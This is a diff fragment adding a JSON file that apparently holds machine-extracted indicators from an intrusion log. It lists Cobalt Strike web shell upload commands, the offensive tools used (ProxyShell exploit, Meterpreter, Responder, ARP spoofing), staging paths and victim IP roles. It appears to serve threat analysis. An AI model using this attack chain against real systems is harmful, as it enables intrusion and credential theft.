+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "cd /home/user/sshbrutesim",
+            "tool_context": "bash",
+            "target": "",
+            "parameters": {
+              "path": "/home/user/sshbrutesim"
+            },
+            "line_number": "57",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "58",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "59",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "60",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "61",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "command": "Upload /home/user/util.aspx",
+            "tool_context": "cobalt strike",
+            "target": "",
+            "parameters": {
+              "source": "/home/user/util.aspx"
+            },
+            "line_number": "62",
+            "segment_id": 1,
+            "source": "llm"
+          }
+        ],
+        "processing_time_seconds": 61.53
+      }
+    ],
+    "tools": [
+      {
+        "segment_id": 1,
+        "segment_title": "Complete Document",
+        "tools": [
+          {
+            "name": "Metasploit",
+            "category": "c2_framework",
+            "usage": "Used via msfconsole to exploit Exchange ProxyShell RCE, set payload, and upload a malicious executable.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Meterpreter",
+            "category": "c2_framework",
+            "usage": "Post‑exploitation payload providing an interactive shell to upload and execute files on the compromised host.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Cobalt Strike",
+            "category": "c2_framework",
+            "usage": "Provides beacons for command‑and‑control, used for lateral movement, port forwarding, uploading web shells, and executing PowerShell commands.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Responder",
+            "category": "credential_tool",
+            "usage": "Run to capture NTLM hashes via LLMNR/NBT‑NS spoofing on the internal network.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "SSH",
+            "category": "network_tool",
+            "usage": "Used for reverse SSH tunnels, remote command execution, and mounting shares on compromised hosts.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Nmap",
+            "category": "recon_tool",
+            "usage": "Scans target host (151.102.65.143) for service/version detection and OS fingerprinting.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Proxychains",
+            "category": "network_tool",
+            "usage": "Chains proxies to SSH into a Cisco device through a proxy configuration.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Sliver",
+            "category": "c2_framework",
+            "usage": "Used to interact with a DNS beacon and download documents from the compromised system.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Arp Spoofer",
+            "category": "network_tool",
+            "usage": "Python script (arpspoofer.py) used to perform ARP spoofing against the target network.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Python HTTP Server",
+            "category": "script",
+            "usage": "Serves files over HTTP on port 8080 for later download by compromised hosts.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "run_brute.ps1",
+            "category": "script",
+            "usage": "PowerShell script uploaded and executed to perform brute‑force attacks.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "clrhost.ps1",
+            "category": "script",
+            "usage": "PowerShell script scheduled via schtasks to run on logon for persistence.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "Socks5 Proxy",
+            "category": "network_tool",
+            "usage": "Established on port 9050 to route traffic through Cobalt Strike.",
+            "confidence": "high",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "nltest",
+            "category": "recon_tool",
+            "usage": "Used to enumerate domain controllers in the target environment.",
+            "confidence": "medium",
+            "segment_id": 1,
+            "source": "llm"
+          },
+          {
+            "name": "nslookup",
+            "category": "recon_tool",
+            "usage": "Used to resolve DNS records for domain discovery.",
+            "confidence": "medium",
+            "segment_id": 1,
+            "source": "llm"
+          }
+        ],
+        "processing_time_seconds": 17.05
+      }
+    ],
+    "file_paths": [
+      {
+        "segment_id": 1,
+        "segment_title": "Complete Document",
+        "paths": {
+          "windows": [
+            {
+              "path": "C:\\Users\\Administrator\\Documents",
+              "role": "destination",
+              "context": "Meterpreter changed directory and used as target for file upload",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "C:\\Users\\Administrator\\Documents\\AWSAuthService.exe",
+              "role": "destination|executable",
+              "context": "File uploaded via Meterpreter and later executed on the compromised host",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "C:\\Windows\\AWSAuthService.exe",
+              "role": "destination|executable",
+              "context": "Path where the payload is downloaded with Invoke-WebRequest and then started",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "C:\\Windows\\System32\\",
+              "role": "destination",
+              "context": "Target directory for copying files from a network share",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "\\\\31.148.54.96\\Share",
+              "role": "source",
+              "context": "UNC network share mounted with net use before copying files",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "C:\\Windows\\System32\\SymantecSysMonitor.exe",
+              "role": "executable",
+              "context": "Listed as a running process in the beacon capture",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "C:\\Users\\fannie.sparks\\Documents",
+              "role": "working_directory",
+              "context": "Sliver beacon changed directory to this location",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "C:\\inetpub\\wwwroot\\aspnet_client",
+              "role": "destination",
+              "context": "Web root directory where util.aspx was uploaded as a web shell",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "C:\\Windows\\system32\\clrhost.ps1",
+              "role": "destination|script",
+              "context": "Script placed for execution by a scheduled task (schtasks)",
+              "segment_id": 1,
+              "source": "llm"
+            }
+          ],
+          "linux": [
+            {
+              "path": "/home/user/Desktop/AWSAuthService.exe",
+              "role": "source",
+              "context": "Local file supplied as source for Meterpreter upload",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "/home/user/util.aspx",
+              "role": "source",
+              "context": "Web shell file uploaded to the target web server",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "/home/user/run_brute.ps1",
+              "role": "source",
+              "context": "PowerShell script uploaded for execution on a remote Windows host",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "~/Responder/Responder.py",
+              "role": "executable",
+              "context": "Responder script run with sudo to capture credentials",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "~/Arp-Spoofer",
+              "role": "working_directory",
+              "context": "Directory changed into before running arpspoofer.py",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "./arpspoofer.py",
+              "role": "executable",
+              "context": "ARP spoofing Python script executed with sudo",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "/home/user/sshbrutesim",
+              "role": "working_directory",
+              "context": "Directory changed into before starting a Python HTTP server",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "path": "/home/user/clrhost.ps1",
+              "role": "source",
+              "context": "PowerShell script uploaded to multiple targets via CS upload",
+              "segment_id": 1,
+              "source": "llm"
+            }
+          ]
+        },
+        "processing_time_seconds": 17.76
+      }
+    ],
+    "network_relationships": [
+      {
+        "segment_id": 1,
+        "segment_title": "Complete Document",
+        "relationships": {
+          "ip_roles": [
+            {
+              "ip": "151.102.64.5",
+              "role": "target_victim",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "ip": "151.102.64.6",
+              "role": "target_victim",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "ip": "151.102.64.8",
+              "role": "target_victim",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "ip": "151.102.65.1",
+              "role": "pivot_host",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "ip": "151.102.65.142",
+              "role": "target_victim",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "ip": "151.102.65.143",
+              "role": "target_victim",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "ip": "151.102.65.144",
+              "role": "target_victim",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "ip": "151.102.65.57",
+              "role": "target_victim",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "ip": "31.148.54.96",
+              "role": "target_victim",
+              "confidence": "high",
+              "segment_id": 1,
+              "source": "llm"
+            }
+          ],
+          "connections": [
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.64.6",
+              "protocol": "http",
+              "description": "Exploit exchange_proxyshell_rce via HTTP",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.64.5",
+              "protocol": "ssh",
+              "description": "SSH session to create new AD user",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.64.8",
+              "protocol": "wmic",
+              "description": "WMIC remote command execution to download and run AWSAuthService.exe",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.65.144",
+              "protocol": "wmic",
+              "description": "WMIC remote command execution to download and run AWSAuthService.exe",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.65.142",
+              "protocol": "wmic",
+              "description": "WMIC remote command execution to download and run AWSAuthService.exe",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.65.57",
+              "protocol": "wmic",
+              "description": "WMIC remote command execution to download and run AWSAuthService.exe",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.65.143",
+              "protocol": "ssh",
+              "description": "SSH session for file staging and later SMB copy",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "151.102.65.143",
+              "target_ip": "31.148.54.96",
+              "protocol": "smb",
+              "description": "Mounted SMB share (net use) to copy files from 31.148.54.96",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.65.1",
+              "protocol": "ssh",
+              "description": "ProxyChains SSH to Cisco device for NAT configuration",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.64.8",
+              "protocol": "http",
+              "description": "Web shell interaction via HTTP GET to util.aspx on 151.102.64.8",
+              "segment_id": 1,
+              "source": "llm"
+            },
+            {
+              "source_ip": "attacker",
+              "target_ip": "151.102.65.143",
+              "protocol": "nmap",
+              "description": "Nmap service/version scan of 151.102.65.143",
+              "segment_id": 1,
+              "source": "llm"
+            }
+          ]
+        },
+        "processing_time_seconds": 16.62
+      }
+    ]
+  }
+}
